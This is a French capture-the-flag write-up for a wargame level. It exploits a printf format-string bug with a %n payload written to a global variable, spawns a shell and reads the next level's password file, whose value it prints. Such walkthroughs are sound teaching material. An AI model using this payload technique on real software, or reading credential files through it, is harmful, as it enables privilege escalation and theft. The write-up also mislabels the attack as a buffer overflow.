## LEVEL 3

En inspectant le code avec gdb, nous voyons que le programme appelle printf, mais directement avec la variable passe en argument. Il n'y a donc pas de formatage de la chaine de caractere. Et egalement, on se rends compte que le programme appelle system si le m(pas encore initialise) est egal a 64.

D'apres le man de printf: `Un code tel que printf(foo); indique souvent un bogue, car foo peut contenir un caractère « % ». Si foo vient d'une saisie non sécurisée, il peut contenir « %n », ce qui autorise printf() à écrire dans la mémoire, et crée une faille de sécurité.  `

```c
void v(void)

{
  char local_20c [520];

  fgets(local_20c,0x200,stdin);
  printf(local_20c);
  if (m == 64) {
    fwrite("Wait what?!\n",1,0xc,stdout);
    system("/bin/sh");
  }
  return;
}
```

On peut donc deja trouver l'adresse de la variable m avec gdb

```
info variables

0x0804988c  m
```

On peut exploiter le faire que printf ne reformate pas ce qu'on envoie pour faire une attaque de type buffer overflow.

```python
echo "iiii  %x | %x | %x | %x" | ./level3
200 | b7fd1ac0 | b7ff37d0 | 69696969
```

Notre buffer est donc affiche en 4 eme position, on peut donc mettre exploiter le 4 eme % de printf avec %n pour ecrire dans la variable m.

```python
python -c 'print "\x8c\x98\x04\x08"+"rainfall <3 "*5 + "%4$n"' | ./level3
�rainfall <3 rainfall <3 rainfall <3 rainfall <3 rainfall <3
Wait what?!
```

On peut maintenant juste maintenir la connexion avec le shell et faire un cat sur le fichier contenant le mot de passe.

```python
(python -c 'print "\x8c\x98\x04\x08"+"rainfall <3 "*5 + "%4$n"'; cat -) | ./level3
�rainfall <3 rainfall <3 rainfall <3 rainfall <3 rainfall <3
Wait what?!
cat ~level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
